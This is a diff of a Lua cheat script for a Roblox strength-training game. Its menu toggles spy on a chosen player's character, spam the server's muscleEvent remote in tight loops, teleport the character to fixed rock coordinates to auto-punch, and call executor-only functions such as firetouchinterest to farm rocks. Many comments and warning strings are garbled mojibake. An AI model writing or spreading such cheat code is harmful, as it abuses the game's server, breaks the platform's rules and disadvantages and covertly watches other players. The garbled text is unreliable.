             local targetName = PlayerDropdown.Value
             if not targetName then
-                warn("⚠️ Сначала выберите игрока!")
+                warn("âš ï¸ Choose player first!")
                 SpyToggle:SetValue(false)
                 return
             end
             
             local TargetPlayer = Players:FindFirstChild(targetName)
             if not TargetPlayer then
-                warn("🚨 Игрок не найден!")
+                warn("ðŸš¨ Player not found!")
                 SpyToggle:SetValue(false)
                 return
             end
             
-            -- Функция слежения за персонажем
             local function trackCharacter()
                 if TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                     Camera.CameraType = Enum.CameraType.Scriptable
@@ -832,24 +688,20 @@ local SpyToggle = Tabs.Main:AddToggle("SpyPlayerToggle", {
                 end
             end
             
-            -- Запускаем слежение
             spyConnection = game:GetService("RunService").Heartbeat:Connect(function()
                 trackCharacter()
             end)
             
-            -- Обработчик смены персонажа
             characterConnection = TargetPlayer.CharacterAdded:Connect(function()
-                task.wait(1) -- Ждем полной загрузки персонажа
+                task.wait(1)
                 trackCharacter()
             end)
             
-            -- Первоначальная настройка
             if TargetPlayer.Character then
                 trackCharacter()
             end
             
         else
-            -- Выключаем слежку
             if spyConnection then spyConnection:Disconnect() end
             if characterConnection then characterConnection:Disconnect() end
             Camera.CameraType = Enum.CameraType.Custom
@@ -857,24 +709,22 @@ local SpyToggle = Tabs.Main:AddToggle("SpyPlayerToggle", {
     end
 })
 
--- Функция обновления списка игроков
 local function updatePlayerList()
     local playerList = {}
     for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then -- Исключаем себя
+        if player ~= LocalPlayer then
             table.insert(playerList, player.Name)
         end
     end
     PlayerDropdown:SetValues(playerList)
 end
 
--- Инициализация и подписки на события
 updatePlayerList()
 Players.PlayerAdded:Connect(updatePlayerList)
 Players.PlayerRemoving:Connect(updatePlayerList)
 
--- Подсказка для пользователя
-warn("ℹ️ Выберите игрока из списка и включите тоггл для слежки")
+warn("â„¹ï¸ Select a player from the list and enable toggle for spying")
+
 -- Paid Tab
 
 local Section6 = Tabs.PaidTab:AddSection("Fast Stuff (Need 7 new packs)")
@@ -887,20 +737,19 @@ local Toggle9 = Tabs.PaidTab:AddToggle("MyToggle",
     Default = false,
     Callback = function(state)
 	if Value then
-        k() -- Р’С‹Р·РѕРІ С„СѓРЅРєС†РёРё РЅР° РІРєР»СЋС‡РµРЅРёРµ С‚СѓРјР±Р»РµСЂР°
-        isFarming = true -- РЈСЃС‚Р°РЅРѕРІРёС‚Рµ С„Р»Р°Рі РІ true
+        k()
+        isFarming = true
 
-        -- РћСЃРЅРѕРІРЅРѕР№ С†РёРєР» РґР»СЏ Р±С‹СЃС‚СЂРѕРіРѕ РїРѕР»СѓС‡РµРЅРёСЏ Strength
         task.spawn(function()
-            while isFarming do -- РџСЂРѕРІРµСЂСЏР№С‚Рµ СЃРѕСЃС‚РѕСЏРЅРёРµ С„Р»Р°РіР°
+            while isFarming do
                 for y = 1, 22 do
                     c.muscleEvent:FireServer("rep")
                 end
-                task.wait(0.001) -- РћС‡РµРЅСЊ Р±С‹СЃС‚СЂРѕ
+                task.wait(0.001)
             end
         end)
     else
-        isFarming = false -- РЈСЃС‚Р°РЅРѕРІРёС‚Рµ С„Р»Р°Рі РІ false, С‡С‚РѕР±С‹ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ С†РёРєР»
+        isFarming = false
     end
 end
 })
@@ -920,7 +769,6 @@ local Toggle10 = Tabs.PaidTab:AddToggle("MyToggle",
     else
         if rebirthActive then
             rebirthActive = false
-            -- Р—РґРµСЃСЊ РґРѕР±Р°РІСЊС‚Рµ РєРѕРґ РґР»СЏ Р±РµР·РѕРїР°СЃРЅРѕРіРѕ Р·Р°РІРµСЂС€РµРЅРёСЏ РёР»Рё РѕС‚РјРµРЅС‹ СЌС„С„РµРєС‚Р° Fast Rebirths, РµСЃР»Рё СЌС‚Рѕ РЅРµРѕР±С…РѕРґРёРјРѕ
         end
     end
 end
@@ -928,1036 +776,173 @@ end
 
 -- Glitching
 
-local Section7 = Tabs.Glitching:AddSection("Rocks")
+local Section7 = Tabs.AutoFarm:AddSection("Rocks")
 
-local autoMode = false
-local connections = {}
+local player = game.Players.LocalPlayer
 
-local Toggle11 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Tiny Rock (0)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(17.6399956, -1.30998898, 2105.49121, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
+local function gettool()
+    local tool = player.Backpack:FindFirstChild("Punch")
+    if tool then
+        tool.Parent = player.Character
     end
 end
-})
 
-local Toggle12 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Punching Rock (10)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(-151.459747, 0.540015221, 422.589905, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
+local function farmRocks(neededDurabilityValue)
+    while getgenv().autoFarm do
+        task.wait(.1)
+        local character = player.Character
+
+        if character and player.Durability.Value >= neededDurabilityValue then
+            for _, v in pairs(game:GetService("Workspace").machinesFolder:GetDescendants()) do
+                if v.Name == "neededDurability" and v.Value == neededDurabilityValue then
+                    if character:FindFirstChild("LeftHand") and character:FindFirstChild("RightHand") then
+                        firetouchinterest(v.Parent.Rock, character.RightHand, 0)
+                        firetouchinterest(v.Parent.Rock, character.RightHand, 1)
+                        firetouchinterest(v.Parent.Rock, character.LeftHand, 0)
+                        firetouchinterest(v.Parent.Rock, character.LeftHand, 1)
+                        gettool()
                     end
                 end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
             end
         end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
+
+        if _G.fastHitActive then
+            player.muscleEvent:FireServer("punch", "rightHand")
+            player.muscleEvent:FireServer("punch", "leftHand")
+            local punchTool = character:FindFirstChild("Punch")
+            if punchTool then
+                punchTool:Activate()
+            end
         end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
     end
 end
+
+local rockOptions = {
+    {
+        Text = "Tiny Rock (0)",
+        Value = 0,
+        Desc = "Tiny Island Rock"
+    },
+    {
+        Text = "Punching Rock (100)",
+        Value = 100,
+        Desc = "Starter Island Rock"
+    },
+    {
+        Text = "Golden Rock (5000)",
+        Value = 5000,
+        Desc = "Legend Beach Rock"
+    },
+    {
+        Text = "Frost Rock (150000)",
+        Value = 150000,
+        Desc = "Frost Gym Rock"
+    },
+    {
+        Text = "Mystic Rock (400000)",
+        Value = 400000,
+        Desc = "Mythical Gym Rock"
+    },
+    {
+        Text = "Eternal Rock (750000)",
+        Value = 750000,
+        Desc = "Eternal Gym Rock"
+    },
+    {
+        Text = "Legend Rock (1000000)",
+        Value = 1000000,
+        Desc = "Legend Gym Rock"
+    },
+    {
+        Text = "Muscle King Rock (5000000)",
+        Value = 5000000,
+        Desc = "Muscle King Gym Rock (Recommended size 5)"
+    },
+    {
+        Text = "Jungle Rock (10000000)",
+        Value = 10000000,
+        Desc = "Ancient Jungle Rock"
+    }
+}
+
+local selectedRockValue = 0
+local Dropdown = Tabs.AutoFarm:AddDropdown("RockSelector", {
+    Title = "Select Rock Type",
+    Values = {"Tiny Rock (0)", "Punching Rock (100)", "Large Rock (5000)", "Frost Rock (150000)", "Mystic Rock (400000)", "Eternal Rock (750000)", "Legend Rock (1000000)", "Muscle King Rock (5000000)", "Jungle Rock (10000000)"},
+    Multi = false,
+    Default = "Tiny Rock (0)",
 })
 
-local Toggle13 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Large Rock (100)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(166.639954, 0.540015221, -152.410172, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
+Dropdown:OnChanged(function(Value)
+    for _, option in pairs(rockOptions) do
+        if option.Text == Value then
+            selectedRockValue = option.Value
+            break
         end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
     end
-end 
+end)
+
+local Toggle = Tabs.AutoFarm:AddToggle("AutoFarmToggle", {
+    Title = "Auto Farm Rocks",
+    Default = false,
+    Callback = function(Value)
+        getgenv().autoFarm = Value
+        if Value then
+            farmRocks(selectedRockValue)
+        end
+    end
 })
 
-local Toggle14 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Golden Rock (5.000)", 
+local FastToggle = Tabs.AutoFarm:AddToggle("FastHitToggle", {
+    Title = "Fast Hit Mode",
     Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(310.082153, -2.8099637, -594.586548, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
+    Callback = function(Value)
+        _G.fastHitActive = Value
     end
+})
+
+local Section15 = Tabs.AutoFarm:AddSection("Auto Tools")
+
+function gettool()
+    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        if v.Name == "Punch" and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+            game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
+        end
+    end
+    game:GetService("Players").LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
+    game:GetService("Players").LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
 end
-})
 
-local Toggle15 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Frost Rock (150.000)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(-2551.75854, -0.359962642, -243.308777, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-    end
-end
-})
-
-local Toggle16 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Mystic Rock (400.000)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(2186.14111, -0.359961987, 1250.59802, 0.996191859, -0, -0.0871884301, 0, 1, -0, 0.0871884301, 0, 0.996191859)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
